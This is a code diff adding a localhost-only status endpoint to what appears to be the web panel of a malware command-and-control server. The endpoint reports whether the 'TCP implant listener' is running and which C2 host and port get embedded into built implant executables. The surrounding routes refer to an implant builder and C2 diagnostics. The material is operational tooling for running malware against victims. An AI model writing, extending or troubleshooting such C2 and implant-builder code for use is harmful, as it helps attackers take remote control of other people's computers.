@@ -2773,6 +2773,40 @@ app.get('/api/builder/builds', requireAuth, (req, res) => {
   }
 });
 
+/** Localhost-only quick check: curl http://127.0.0.1:5000/api/c2/status */
+app.get('/api/c2/status', (req, res) => {
+  const ip = String(req.socket?.remoteAddress || '');
+  const local = ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1';
+  if (!local) {
+    return res.status(403).json({ error: 'Use from VPS: curl http://127.0.0.1:PORT/api/c2/status' });
+  }
+  try {
+    const settings = getAllSettings();
+    const listen = getTcpListenInfo();
+    const embedHost = resolveBuildC2Host(req);
+    const embedPort = resolveBuildC2Port(settings);
+    const issues = [];
+    if (!listen) issues.push('TCP implant listener is DOWN');
+    if (!embedHost) issues.push('BUILD_C2_HOST missing');
+    res.json({
+      ok: issues.length === 0,
+      issues,
+      tcpListening: !!listen,
+      tcpListen: listen,
+      embedTarget: embedHost ? `${embedHost}:${embedPort}` : null,
+      env: {
+        APP_ENV: process.env.APP_ENV,
+        BUILD_C2_HOST: process.env.BUILD_C2_HOST || null,
+        TCP_PORT: process.env.TCP_PORT || null,
+        PORT: process.env.PORT || null,
+      },
+      hint: 'Implant EXE must dial embedTarget. On connect expect pm2 log: [TCP] New client connected',
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message || 'status failed' });
+  }
+});
+
 app.get('/api/builder/c2-diagnostics', requireAuth, (req, res) => {
   try {
     const settings = getAllSettings();
